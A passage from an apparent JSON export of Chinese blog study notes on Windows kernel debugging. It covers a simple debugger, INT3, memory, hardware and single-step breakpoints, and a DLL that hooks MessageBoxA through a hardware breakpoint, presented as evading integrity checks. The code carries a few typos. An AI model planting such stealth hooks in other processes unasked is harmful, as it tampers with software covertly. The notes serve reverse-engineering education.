TRUE, DEBUG_PROCESS||DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &startupInfo, &pInfo); if (bRet == FALSE) { printf(\"CreateProcess error:%d\\n\", GetLastError()); getchar(); return 0; } //2.调试循环 while (nIsConinue) { //取DEBUG_EVENT bRet = WaitForDebugEvent(&debugEvent, INFINITE); if (!bRet) { printf(\"WaitForDebugEvent error:%d\\n\", GetLastError()); return 0; } switch (debugEvent.dwDebugEventCode) { case EXCEPTION_DEBUG_EVENT: // printf(\"异常：发生异常的地址：%X \\n\",debugEvent.u.Exception.ExceptionRecord.ExceptionAddress); // printf(\"发生异常调试事件\\n\"); bRet = ExceptionHandler(&debugEvent); if(!bRet) dwContinue = DBG_EXCEPTION_NOT_HANDLED; break; case CREATE_THREAD_DEBUG_EVENT: // printf(\"创建线程调试事件\\n\"); break; case CREATE_PROCESS_DEBUG_EVENT: // printf(\"创建进程调试事件\\n\"); processInfo = debugEvent.u.CreateProcessInfo; hDebugeeProcess = processInfo.hProcess; //OEP处下INT3断点 SetInt3BreakPoint(); break; case EXIT_THREAD_DEBUG_EVENT: // printf(\"退出线程调试事件\\n\"); break; case EXIT_PROCESS_DEBUG_EVENT: // printf(\"退出进程调试事件\\n\"); break; case LOAD_DLL_DEBUG_EVENT: // printf(\"加载DLL调试事件\\n\"); break; case UNLOAD_DLL_DEBUG_EVENT: // printf(\"卸载DLL调试事件\\n\"); break; default: break; } //DBG_CONTINUE 表示调试器已处理该异常 //DBG_EXCEPTION_NOT_HANDLED 表示调试器没有处理该异常，转回到用户态中执行，寻找可以处理该异常的异常处理器 //ContinueDebugEvent 告诉被调试程序让被调试程序继续执行 bRet = ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE); } return 0;}BOOL ExceptionHandler(DEBUG_EVENT* pDebugEvent){ BOOL bRet = TRUE; EXCEPTION_DEBUG_INFO* pExceptionInfo = NULL; //获取异常事件结构体 pExceptionInfo = &pDebugEvent->u.Exception; //通过线程ID获取线程句柄 FnOpenThread MyOpenThread = (FnOpenThread)GetProcAddress(LoadLibrary(\"Kernel32.dll\"), \"OpenThread\"); hDebugeeThread = MyOpenThread(THREAD_ALL_ACCESS, FALSE, pDebugEvent->dwThreadId); switch(pExceptionInfo->ExceptionRecord.ExceptionCode) { //INT3异常 case EXCEPTION_BREAKPOINT: bRet = Int3ExceptionProc(pExceptionInfo); break; //访问异常 case EXCEPTION_ACCESS_VIOLATION: break; //单步异常 case EXCEPTION_SINGLE_STEP: bRet = SingleStepExceptionProc(pE4xceptionInfo); break; } return bRet;}VOID SetInt3BreakPoint(){ BYTE INT3 = 0xCC; ReadProcessMemory(hDebugeeProcess, processInfo.lpStartAddress, &OriginalCode, 1, NULL); WriteProcessMemory(hDebugeeProcess, processInfo.lpStartAddress, &INT3, 1, NULL);}BOOL Int3ExceptionProc(EXCEPTION_DEBUG_INFO* pExceptionInfo){ BOOL bRet = FALSE; CONTEXT Context; //1.将INT3修复为原来的数据(如果是系统断点，不用修复) if(IsSystemInt3(pExceptionInfo)) return TRUE; else WriteProcessMemory(hDebugeeProcess, pExceptionInfo->ExceptionRecord.ExceptionAddress, &OriginalCode, 1, NULL); //2.显示断点位置 printf(\"int 3断点: 0x%p \\n\",pExceptionInfo->ExceptionRecord.ExceptionAddress); //3.获取线程上下文 Context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS; GetThreadContext(hDebugeeThread,&Context); //4.修复EIP Context.Eip--; SetThreadContext(hDebugeeThread, &Context); //5.显示反汇编 //这里设置硬件断点 //SetHardBreakPoint((PVOID)((DWORD)pExceptionInfo->ExceptionRecord.ExceptionAddress+1)); //6.等待用户命令 while(bRet == FALSE) { bRet = WaitForUserCommand(); } return bRet;}BOOL IsSystemInt3(EXCEPTION_DEBUG_INFO* pExceptionInfo){ return (pExceptionInfo->ExceptionRecord.ExceptionAddress == (PVOID)SystemInt3);}VOID SetHardBreakPoint(PVOID pAddress){ CONTEXT Context; //1.获取线程上下文 Context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS; GetThreadContext(hDebugeeThread, &Context); //2.设置断点位置 Context.Dr0 = (DWORD)pAddress; Context.Dr6 |= 1; Context.Dr7 |= 1; //3.设置断点长度 Context.Dr7 &= 0xfff0ffff; //4.设置线程上下文 SetThreadContext(hDebugeeThread, &Context); ResumeThread(hDebugeeThread);}VOID SetSingleStep(){ CONTEXT Context; Context.ContextFlags = CONTEXT_FULL || CONTEXT_DEBUG_REGISTERS; GetThreadContext(hDebugeeThread, &Context); Context.EFlags |= 0x100; SetThreadContext(hDebugeeThread, &Context);}BOOL SingleStepExceptionProc(EXCEPTION_DEBUG_INFO* pExceptionInfo){ CONTEXT Context; BOOL bRet = FALSE; //1.获取线程上下文 Context.ContextFlags = CONTEXT_FULL || CONTEXT_DEBUG_REGISTERS; GetThreadContext(hDebugeeThread, &Context); //2.判断是什么导致的单步异常 if(Context.Dr6 & 0xF){ //硬件断点导致的单步异常 //显示断点信息 printf(\"硬件断点 %d 0x%p\\n\",Context.Dr7 & 0x00030000,Context.Dr0); //去除断点 Context.Dr0 = 0; Context.Dr7 &= 0xfffffffe; }else{ //显示断点信息 printf(\"单步异常 0x%p\\n\",Context.Eip); //去除单步 Context.EFlags &= 0xfffffeff; } SetThreadContext(hDebugeeThread, &Context); while(bRet == FALSE) { bRet = WaitForUserCommand(); } return bRet;}BOOL WaitForUserCommand(){ BOOL bRet = FALSE; char CMD; printf(\"COMMAND>\"); CMD = getchar(); fflush(stdin); switch(CMD) { //单步步入 case't': bRet = TRUE; SetSingleStep(); break; case'g': bRet = TRUE; break; } return bRet;} 参考资料参考笔记： 张嘉杰笔记 参考教程： 海哥逆向中级预习班教程","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"单步步入与单步步过","slug":"单步步入与单步步过","date":"2020-09-20T09:47:11.000Z","updated":"2022-05-17T15:40:19.897Z","comments":true,"path":"2020/09/20/单步步入与单步步过/","link":"","permalink":"http://cata1oc.github.io/2020/09/20/%E5%8D%95%E6%AD%A5%E6%AD%A5%E5%85%A5%E4%B8%8E%E5%8D%95%E6%AD%A5%E6%AD%A5%E8%BF%87/","excerpt":"","text":"前言本篇将是学习调试相关的最后一篇，也是Windows(XP)内核基础的最后一篇了。下一篇开始将会进入到网络安全领域的基础学习。本篇介绍调试相关最后的内容，单步步入与单步步过。对于经常用OD的人来说，其实就是相当于F7与F8的功能，F7可以单步执行每一行指令，F8可以跳过call指令，接下来就学习一下它们的原理和简单的实现。 单步步入实现原理想要实现单步步入，有很多手段，可以通过不断的下软件断点，每执行一行，就下一个INT3，然后恢复再重新执行。虽然这是可行的办法，但是过于复杂，因此Intel在设计CPU时考虑到了这一点，调试程序是必不可少的手段，因而在Eflags里设置了一个TF位。 单步步入的实现就是利用了这个TF位。在前一篇学习硬件断点时提到过，有两种情况会导致单步异常，一种情况是触发了硬件断点，另一种情况则是Eflags的TF位被置为了1。因此调试寄存器Dr6被专门用来判断当前的单步异常属于哪一类。 当在调试器中执行单步操作时，就会将Eflags的TF位设置为1，从而产生单步异常，接下来的步骤，与硬件断点的执行流程是一样的，查找1号中断处理函数。并最终将该类型调试事件发送给调试器。 单步步入函数单步步入的实现，就是将Context记录的Eflags的TF置1。 c123456789VOID SetSingleStep(){ CONTEXT Context; Context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS; GetThreadContext(hDebugeeThread, &Context); //将Eflags的TF置1 Context.EFlags |= 0x100; SetThreadContext(hDebugeeThread, &Context);} 处理函数由于单步步入与硬件断点触发的异常都属于单步异常，因此这两种异常使用同一个处理函数。仅需判断一下Dr6的值即可。 c1234567891011121314151617181920212223242526272829303132333435BOOL SingleStepExceptionProc(EXCEPTION_DEBUG_INFO * pExceptionInfo){ CONTEXT Context; BOOL bRet = FALSE; //1.获取线程上下文 Context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS; GetThreadContext(hDebugeeThread,&Context); //2.判断是否是硬件断点导致的异常 if(Context.Dr6&0xF) //B0~B3不为空 { //显示断点信息 printf(\"硬件断点 %d 0x%p\\n\",Context.Dr7 & 0x00030000,Context.Dr0); //将断点去除 Context.Dr0 = 0; Context.Dr7 &= 0xfffffffe; } else { //显示断点信息 printf(\"单步异常 0x%p\\n\",Context.Eip); //去除单步异常 Context.EFlags &= 0xfffffeff; } //3.等待用户命令 while(bRet == FALSE) { bRet = WaitForUserCommand(); } return bRet;} 除此之外，有了单步步入后，也可以进一步补充WaitForUserCommand函数 c1234567891011121314151617181920212223BOOL WaitForUserCommand(){ BOOL bRet = FALSE; BYTE CMD; printf(\"COMMAND>\"); CMD = getchar(); fflush(stdin); switch(CMD) { //单步步入 case't': bRet = TRUE; SetSingleStep(); break; //继续执行 case'g': bRet = TRUE; break; }} 单步步过实现原理单步步过对应OD的F8，也就是遇到call指令的时候不跟进去，直接跳过。实现的原理是遇到call指令（好几种）后，计算当前指令的长度，然后在（当前EIP+当前指令长度）的地方下断（也就是call指令的下一行），然后执行CPU，便可以实现单步步过。实现过程有一点小复杂，所以这里没有下断过程与处理函数。 反调试技巧针对单步步过也有一种反调试技巧，可以设置多段call调用，而逆向的人不可能会跟进每一个函数里，就会使用单步步过，这时可以修改call函数里堆栈的返回地址，让函数返回的别的位置，这样逆向的人再尝试单步步过，就会跟丢了，从而达到反调试的目的。 总结至此，调试章节告一段落，Windows内核也完结了。之后会更新一篇调试器的简单实现，完成对调试与异常章节的收束。这一篇不会一次更新完，每天调试一点，保持对内核的熟悉，并在之后从头开始复习内核的内容，也必然会对之前的博客有些许修改。接下来就到网安篇了，希望2020年能搞定鸭！ 参考资料参考笔记： 张嘉杰笔记 My classmates笔记 参考教程： 海哥逆向中级预习班","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"硬件断点","slug":"硬件断点","date":"2020-09-19T09:40:54.000Z","updated":"2022-05-17T15:39:39.879Z","comments":true,"path":"2020/09/19/硬件断点/","link":"","permalink":"http://cata1oc.github.io/2020/09/19/%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9/","excerpt":"","text":"前言前两篇介绍了软件断点与内存断点，这两种类型的断点都会留下明显的痕迹，也有相应的应对措施，对于软件断点，可以用CRC校验来检测；对于内存断点，可以起一个线程不断刷新PTE的属性，防止其被修改。而本篇要介绍的硬件断点就比较难防了，所以这也是硬件断点值得学习的地方。 硬件断点的原理硬件断点的实现需要借助调试寄存器DR0~DR7，其结构如下： DR0~DR3这四个寄存器用于设置硬件断点，由于只有4个断点寄存器，所以最多只能设置4个硬件调试断点。 DR7Dr7是最重要的寄存器，它控制着断点的各类属性： L0/G0-L3/G3：控制Dr0-Dr3是否有效，是局部还是全局的。每次异常后，Lx都被清零，Gx不清零。 LENx(断点长度)：00(1字节)，01(2字节)，11(4字节) R/Wx(断点类型)：00(执行断点)，01(写入断点)，11(访问断点) DR6 硬件调试断点产生的异常是 STATUS_SINGLE_STEP（单步异常） B0~B3：哪个寄存器触发的异常。 但是还有一种情况也会产生单步异常 当Eflags的TF位置1时，产生的异常也是单步异常。DR6的作用就是用来确定产生的是哪一种单步异常。当B0-B3中有值时，则可以确定是某一个硬件断点触发产生的单步异常。若B0-B3的值均为空，说明是Eflags的TF值置1产生的单步异常。 下断过程下断时将需要下断的线性地址写入Dr0~Dr3中任意一个寄存器中，当CPU执行到该线性地址时，发现与调试寄存器中的值相同，便会断下，触发异常。注意一点，这里下断是修改当前线程Context中记录的调试寄存器的值，线程间是隔离的，因为设置硬件断点不会影响到别的线程。 硬件断点执行流程（被调试进程角度）尽管硬件断点的下断借助了调试寄存器，但是从执行流程上来看，仍然是通过触发异常来实现调试，所以调试的本质就是异常的分发。硬件断点的执行流程也可以完全参考软件断点的执行流程，仅有开始的异常处理函数不同： CPU执行时检测到当前的地址与其中一个调试寄存器（Dr0~Dr3）中存的地址相同。 查IDT表找到对应的中断处理函数（nt!_KiTrap01） CommonDispatchException KiDispatchException DbgkForwardException DbgkpSendApiMessage(x, x) 硬件断点的处理（调试器角度）下断处硬件断点测试时的下断处与软件断点或内存断点不同，软件断点与内存断点都可以断在OEP处，但是硬件断点不可以断在OEP处，因为此时主线程还未创建出来（参考CreateProcess创建调试关系时产生的调试事件） 而硬件断点又是基于线程的。没有线程硬件断点自然是无法触发的。因此可以换一种方式，在OEP处下一个软件断点，当触发软件断点后，会进入软件断点处理函数，这样也就有线程了，就可以触发硬件断点了（可以断在OEP+1处）。硬件断点实现如下（下断处的代码省略）： c1234567891011121314151617VOID SetHardBreakPoint(PVOID pAddress){ CONTEXT Context; //1.获取线程上下文 Context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS; GetThreadContext(hDebugeeThread, &Context); //2.设置断点位置(这里选Dr0作为断点寄存器) Context.Dr0 = (DWORD)pAddress; Context.Dr7 |= 1; //3.设置断点长度 Context.Dr7 &= 0xfff0ffff; //4.设置线程上下文 SetThreadContext(hDebugeeThread, &Context);} 处理函数由于单步异常有两种情况，因此在处理函数内部需要判断一下是否为硬件断点导致的异常，这里的代码逻辑也相对清晰，不作具体分析。 c1234567891011121314151617181920212223242526272829303132333435BOOL SingleStepExceptionProc(EXCEPTION_DEBUG_INFO * pExceptionInfo){ CONTEXT Context; BOOL bRet = FALSE; //1.获取线程上下文 Context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS; GetThreadContext(hDebugeeThread,&Context); //2.判断是否是硬件断点导致的异常 if(Context.Dr6&0xF) //B0~B3不为空 { //显示断点信息 printf(\"硬件断点 %d 0x%p\\n\",Context.Dr7 & 0x00030000,Context.Dr0); //将断点去除 Context.Dr0 = 0; Context.Dr7 &= 0xfffffffe; } else { //显示断点信息 printf(\"单步异常 0x%p\\n\",Context.Eip); //去除单步异常 Context.EFlags &= 0xfffffeff; } //3.等待用户命令 while(bRet == FALSE) { bRet = WaitForUserCommand(); } return bRet;} 硬件Hook过检测学到这里，我们已经掌握了异常以及调试相关的一些基础知识，这里介绍一种可以过检测的Hook手法，利用硬件断点不会修改机器码的特性，以及异常处理函数的机制实现。下面看代码： DLL入口函数c12345678int APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved){ if (reason == DLL_PROCESS_ATTACH) { SetSehHook(); } return TRUE;} DLL核心逻辑c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#include \"windows.h\"#include \"TlHelp32.h\"#include \"stdio.h\"#include \"limits.h\"typedef HANDLE(WINAPI *OPENTHREAD) (DWORD dwFlag, BOOL bUnknow, DWORD dwThreadId);OPENTHREAD g_lpfnOpenThread = NULL;DWORD g_HookAddr;DWORD g_HookAddrOffset;void GetInformation(PCONTEXT context){ printf(\"EAX: %X \\nEBX: %X\\nECX: %X\\nEDX: %X\\nESP: %X\\nEBP: %X\\nESI: %X\\nEDI: %X\\n\", context->Eax, context->Ebx, context->Ecx, context->Edx, context->Esp, context->Ebp, context->Esi, context->Edi ); printf(\"参数 \\n\" \"参数1: %X\\n\" \"参数2: %s\\n\" \"参数3: %s\\n\" \"参数4: %s\\n\", (HWND) (*(DWORD*)(context->Esp + 0x4)), (char*)(*(DWORD*)(context->Esp + 0x8)), (char*)(*(DWORD*)(context->Esp + 0xC)), (UINT) (*(DWORD*)(context->Esp + 0x10)) );}void ModifytheText(PCONTEXT debug_context){ char* text = (char*)(*(DWORD*)(debug_context->Esp + 0x8)); int length = strlen(text); DWORD oldprotect = 0; //修改PTE.P=1 PTE.R/W=0 VirtualProtect(text, length, PAGE_EXECUTE_READWRITE, &oldprotect); //修改messagebox的信息 _snprintf(text, length, \"Hook 成功\"); VirtualProtect(text, length, oldprotect, &oldprotect);}void __declspec(naked) OriginalFunc(void){ __asm { mov edi, edi jmp[g_HookAddrOffset] }}//异常处理函数LONG WINAPI ExceptionFilter(PEXCEPTION_POINTERS ExceptionInfo) { if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) { if ((DWORD)ExceptionInfo->ExceptionRecord->ExceptionAddress == g_HookAddr) { PCONTEXT pcontext = ExceptionInfo->ContextRecord; //修改messagebox信息 ModifytheText(pcontext); //获取寄存器，堆栈信息 GetInformation(pcontext); pcontext->Eip = (DWORD)&OriginalFunc; return EXCEPTION_CONTINUE_EXECUTION; } } return EXCEPTION_CONTINUE_SEARCH;}void SetSehHook(){ g_lpfnOpenThread = (OPENTHREAD)GetProcAddress(LoadLibrary(L\"kernel32.dll\"),\"OpenThread\"); g_HookAddr = (DWORD)GetProcAddress(GetModuleHandle(L\"user32.dll\"), \"MessageBoxA\"); g_HookAddrOffset = g_HookAddr + 2; printf(\"MessageBoxA：%X\\n\", g_HookAddr); //遍历线程 找到要Hook的地址 HANDLE hTool32 = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (hTool32 != INVALID_HANDLE_VALUE) { THREADENTRY32 thread_entry32; thread_entry32.dwSize = sizeof(THREADENTRY32); HANDLE hHookThrad = NULL; DWORD dwCount = 0; if (Thread32First(hTool32, &thread_entry32)) { do { if (thread_entry32.th32OwnerProcessID == GetCurrentProcessId()) { dwCount++; //Hook第一条线程 if (dwCount == 1) { hHookThrad = g_lpfnOpenThread( THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, thread_entry32.th32ThreadID); } } thread_entry32.dwSize = sizeof(THREADENTRY32); } while (Thread32Next(hTool32,&thread_entry32)); //注册顶层异常处理函数 SetUnhandledExceptionFilter(ExceptionFilter); //设置硬件断点 CONTEXT thread_context = { CONTEXT_DEBUG_REGISTERS }; thread_context.Dr0 = g_HookAddr ; thread_context.Dr7 = 1; SetThreadContext(hHookThrad, &thread_context); CloseHandle(hHookThrad); } CloseHandle(hTool32); }} 这里简单说明一下这个代码的逻辑： 首先在SetSehHook函数中获取到想要Hook的地址 然后注册一个顶层异常处理函数ExceptionFilter（在没有调试器，且没有其它SEH的情况下，发生异常一定会调用这），ExceptionFilter调用了ModifytheText以及GetInformation，这两个函数通过Hook实现修改被Hook函数的参数，并打印相关寄存器中的状态。这些信息均可以通过Context获取到。 对要进行Hook的地址设置硬件断点，由于硬件断点就是异常，触发异常时便会调用注册的顶层异常处理函数ExceptionFilter，发生异常时，相应的环境信息也可以通过异常调试事件结构体ExceptionInfo->ContextRecord来获取。但是这个结构里似乎没有ContextRecord，参考下图。 （由于这是海哥的代码，所以理论上是跑的通的。这个点需要保留思考一下，二刷时得跑一遍这个代码，看看这个值是否存在）总之获取了Context保存的信息后，也就获取了寄存器以及堆栈的情况，就可以修改或者打印被Hook函数的参数了，从而达到Hook的目的。 这种依赖硬件断点的Hook，具有一点的隐蔽性，因为它不会修改被Hook的代码本身，但仍然有反制的手段，这里就不再展开。 参考资料参考笔记： 张嘉杰笔记 My classmates笔记1 My classmates笔记2 参考教程： 海哥逆向中级预习班","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"内存断点","slug":"内存断点","date":"2020-09-18T03:07:52.000Z","updated":"2022-05-17T15:39:16.824Z","comments":true,"path":"2020/09/18/内存断点/","link":"","permalink":"http://cata1oc.github.io/2020/09/18/%E5%86%85%E5%AD%98%E6%96%AD%E7%82%B9/","excerpt":"","text":"前言前一篇了解了软件断点，本篇来看内存断点。参考软件断点，本篇依旧从3个角度来看，首先是内存断点的本质；其次站在被调试进程的角度来看，也就是内存断点的执行流程；最后是站在调试器进程的角度来看，就是调试器的代码逻辑。下面，进入正文。 内存断点的本质首先来说说内存断点的本质，前一篇学习的软件断点的本质实际上就是将某个地址的机器码修改为0xCC。内存断点修改的不是机器码，而是修改物理页的属性。调试器进程通过调用VirtualProtectEx函数(Ex：跨进程)来修改被调试进程的物理页属性来达到实现内存断点的目的。以下为VirtualProtectEx函数原型： c12345678//改变内存地址内存页的属性BOOL VirtualProtectEx( IN HANDLE hProcess, // 要修改内存的进程句柄 IN LPVOID lpAddress, // 要修改内存的起始地址 IN SIZE_T dwSize, // 页区域大小 IN DWORD flNewProtect, // 新内存页属性 OUT PDWORD lpflOldProtect //原内存页属性 用于保存改变前的属性) 这里主要关注的是第四个参数flNewProtect，修改它的值，达到修改所指内存所在物理页的PTE属性： PAGE_NOACCESS：不可访问（PTE.P位 = 1） PAGE_EXECUTE_READ：可读可执行，不可写（PTE.P位 = 1， PTE.R/W = 0） 内存断点执行流程（被调试进程角度）当被调试进程下一次试图访问或者写入这个被修改过属性的物理页时，会触发相应的页异常，进入异常处理流程，并最终将该调试事件发送到调试对象，接下来交由调试器接管，所以本质上，还是异常处理流程。 内存断点的执行流程可以完全参考软件断点的执行流程，仅有开始的异常处理函数不一样，这里只做简单概括： CPU访问/写入错误内存地址，触发页异常 查IDT表找到对应的中断处理函数（nt!_KiTrap0E） CommonDispatchException KiDispatchException DbgkForwardException收集并发送调试事件 DbgkpSendApiMessage(x, x) 参数1：消息结构 参数2：是否把本进程内除自己外的其它进程挂起。 内存断点的处理（调试器角度）下断点首先是下断点，手动触发一个内存断点，用来测试自己代码是否跑的通。下断采用的就是VirtualProtectEx，跨进程修改物理页属性。 c1234567VOID SetMemBreakPoint(PCHAR pAddress){ //1.访问断点 VirtualProtectEx(hDebugeeProcess, pAddress, 1, PAGE_NOACCESS, &dwOriginalProtect); //2.写入断点 VirtualProtectEx(hDebugeeProcess, pAddress, 1, PAGE_EXECUTE_READ, &dwOriginalProtect)} 下断点的位置与软件断点一样，位于OEP，即发生创建进程事件时下断点，也因此需要与软件断点分开测试。 异常的判断由于软件断点，内存断点，都是通过异常分发流程执行而来的，所以调试器在收到异常调试事件后，需要判断出是哪种类型的异常（断点） 调试事件DebugEvent的成员dwDebugEventCode可以判断当前调试事件的类型，通过DebugEvent.u.Exception可以获取到异常事件对应的结构体： c1234typedef struct _EXCEPTION_DEBUG_INFO { EXCEPTION_RECORD ExceptionRecord; DWORD dwFirstChance;} EXCEPTION_DEBUG_INFO, *LPEXCEPTION_DEBUG_INFO; 该结构体内的ExceptionRecord成员指向描述异常信息的结构体，这个在学习异常记录时曾提到过。 c12345678typedef struct _EXCEPTION_RECORD { DWORD ExceptionCode; DWORD ExceptionFlags; struct _EXCEPTION_RECORD *ExceptionRecord; PVOID ExceptionAddress; DWORD NumberParameters; UINT_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];} EXCEPTION_RECORD; 其中ExceptionCode指向异常的类型。其取值如下： 这里面可以看到我们比较熟悉的0xC0000005，访问违例，这也正是内存断点引发的异常情况。从而我们可以通过如下的switch…case语句完成对不同类型异常的分别处理。 c123456789101112swtich(pExceptionInfo->ExceptionRecord.ExceptionCode){ //软件异常 case EXCEPTION_BREAKPOINT: bRet = Int3ExceptionProc(pExceptionInfo); break; //内存断点(访问异常) case EXCEPTION_ACCESS_VIOLATION: bRet = AccessExceptionProc(pExceptionInfo); break;} 这里之所以用了EXCEPTION_BREAKPOINT替代STATUS_BREAKPOINT是为了看着更清晰，本质上是一样的，只是Windows又定义了一遍它的宏。 内存断点处理函数下面简要看一下内存断点处理函数的逻辑： c1234567891011121314151617181920212223242526272829BOOL AccessExceptionProc(EXCEPTION_DEBUG_INFO* pExceptionInfo){ BOOL bRet = FALSE; CONTEXT Context; DWORD dwAccessFlag; DWORD dwAccessAddr; DWORD UselessTemp; //1.获取异常信息，修改内存属性 dwAccessFlag = pExceptionInfo->ExceptionRecord.ExceptionInformation[0]; dwAccessAddr = pExceptionInfo->ExceptionRecord.ExceptionInformation[1]; printf(\"内存断点 %x 0x%p\\n\", dwAccessFlag, dwAccessAddr); VirtualProtectEx(hDebugeeProcess, (PVOID)dwAccessAddr, 1, dwOriginalProtect, &UselessTemp); //2.获取线程上下文 Context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS; GetThreadContext(hDebugeeThread,&Context); //3.修复EIP，内存断点不需要修复EIP，软件断点需要 //4.显示反汇编 //5.等待用户命令 while(bRet == FALSE) { bRet = WaitForUserCommand(); } return bRet;} 后面的处理逻辑，与软件断点的差别不大。这里主要看第一个部分，在ExceptionRecord结构体中，有一个数组 根据MSDN，其第一个成员指明异常是因为什么原因导致的（0：有线程试图去读，1：有线程试图去写）。第二个成员标识了虚拟地址在哪，即产生异常的地址是哪里。由于内存断点是对整个物理页下断，因此断下的地方可能并不是我们下断的地方，所以这里取地址判断是否为下断处，若不是则直接放过执行，若是则进行处理。 参考资料参考笔记： 张嘉杰笔记 My classmates笔记 参考教程： 海哥逆向中级预习班","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"软件断点","slug":"软件断点","date":"2020-09-17T05:12:14.000Z","updated":"2022-05-17T15:36:57.317Z","comments":true,"path":"2020/09/17/软件断点/","link":"","permalink":"http://cata1oc.github.io/2020/09/17/%E8%BD%AF%E4%BB%B6%E6%96%AD%E7%82%B9/","excerpt":"","text":"前言在之前的学习中，已经了解了调试器与被调试对象之间如何建立调试关系，也了解了调试事件的采集与处理的过程，在前一篇则回顾了调试与异常之间的联系，本篇将基于以上知识点展开，进一步了解调试相关的细节。 调试的本质调试的本质，就是在被调试进程中触发异常，并由调试器接管异常的过程。 其中有3种触发异常的方式： 软件断点 内存断点 硬件断点 本篇就来分析一下软件断点的实现细节与执行流程。 软件断点的本质软件断点，就是我们常说的INT3，它的本质就是将下断处的机器码修改为0xCC（INT3对应的机器码）下面来验证这一观点： 任意打开一个程序，在某处下断，如下图所示，可以看到此时下断处地址0x004270EF处的机器码并不是0xCC，这主要是调试器为了给用户一个比较直观的感受，并没有修改这里的值，而实际上，这里的值已经为0xCC。下面打开CheatEngine来验证一下。 进入CE，找到0x004270EF处地址的值，转换为16进制。可以看到原先断点处的0x74 0x12变成的0xCC 0x12。这也就验证了INT3的本质，就是将下断处的机器码修改为0xCC。 软件断点执行流程（被调试进程角度）下面来看软件断点的执行流程，触发软件断点的过程，实际上就是CPU异常分发的过程，所以说了解异常是学习调试的基础。 又因为在CPU异常记录一篇中，已经以除零异常为例，分析了异常记录的过程，软件断点的情况也类似，因此这部分就不详细展开。执行流程如下： CPU检测到INT3指令 在中断描述符表中找到3号中断处理函数KiTrap03 中断处理函数内部会调用CommonDispatchException CommonDispatchException内部又会调用KiDispatchException。以上流程均可在CPU异常记录一篇中找到。 进入KiDispatchException，之前在用户异常分发与内核异常分发过程中分析过这个函数，由于是模拟用户层的软件断点，所以这里直接进入处理用户层异常的跳转，在处理用户异常时，如果不存在0环调试器或者0环调试器未处理异常，就会调用DbgkForwardException试图发送给3环调试器。 DbgkForwardException内部最终会调用DbgkpSendApiMessage，在调试事件的采集一篇中分析过，它是将调试事件发送给调试对象的函数。 进入DbgkpSendApiMessage，刚开始会判断第二个参数的值，若该值不为0，则调用DbgkpSuspendProcess将本进程（被调试进程）内除自己外的其它进程挂起，像本例的INT3引起的异常就会挂起。 挂起进程后，调试事件会被发送到调试对象中，调试器将会在循环中取出调试事件，并根据异常调试事件结构体列出相应信息（当前寄存器的值，内存情况），接下来便交由用户处理。 以上就是调试器下了INT3断点后，被调试进程执行到INT3时，内部执行的具体流程，总的来说还是以异常分发为基础，只不过这次不是分发给异常处理函数，而是分发给调试器。总体流程可以参考下图（来自张嘉杰的笔记） 软件断点的处理（调试器角度）下断点为了实现软件断点的功能，需要设置一个软件断点进行测试，手动编写一个SetInt3BreakPoint函数，实现如下： c1234567VOID SetInt3BreakPoint(PCHAR pAddress){ CHAR cInt3 = 0xCC; //1.备份 ReadProcessMemory(hDebugeeProcess, pAddress, &OriginalCode, 1, NULL); //2.修改 WriteProcessMemory(hDebugeeProcess, pAddress, &cInt3, 1, NULL);} 下断点的位置位于OEP，可以放到判断调试事件的switch…case中，当触发创建进程事件时，下该软件断点 软件断点处理函数下面，以代码的形式梳理一下软件断点的处理流程，这里只贴上软件断点部分的代码，在依次学习完各类断点与调试手段后，将会单独开一篇文章写一个功能简单的调试器。 c12345678910111213141516171819202122232425262728293031BOOL Int3ExceptionProc(EXCEPTION_DEBUG_INFO* pExceptionInfo){ BOOL bRet = FALSE; CONTEXT Context; //1.将INT3修复为原来的数据(如果是系统断点，不用修复) if(IsSystemInt3(pExceptionInfo)) return TRUE; else WriteProcessMemory(hDebugeeProcess,pExceptionInfo->ExceptionRecord.ExceptionAddress,&OriginalCode,1,NULL); //2.显示断点位置 printf(\"int 3断点: 0x%p \\n\",pExceptionInfo->ExceptionRecord.ExceptionAddress); //3.获取线程上下文 Context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS; GetThreadContext(hDebugeeThread,&Context); //4.修复EIP Context.Eip--; SetThreadContext(hDebugeeThread, &Context); //5.显示反汇编 //6.等待用户命令 while(bRet == FALSE) { bRet = WaitForUserCommand(); } return bRet;} 下面来梳理一下每一步做的事： 由于INT3是将机器码修改为0xCC，因此重新执行时需要将此机器码恢复。调用IsSytemInt3()函数判断当前INT3是否为系统断点，若为系统断点则不需要修复。IsSystemInt3()由自己实现，系统断点由当前系统环境决定，断点处的地址则可以通过pDebugEvent(调试事件)->u.Exception->ExceptionRecord.ExceptionAddress来获取。然后调用WriteProcessMemory恢复原来的数据。 显示断点的位置，该值保存在ExceptionRecord.ExceptionAddress的地址。 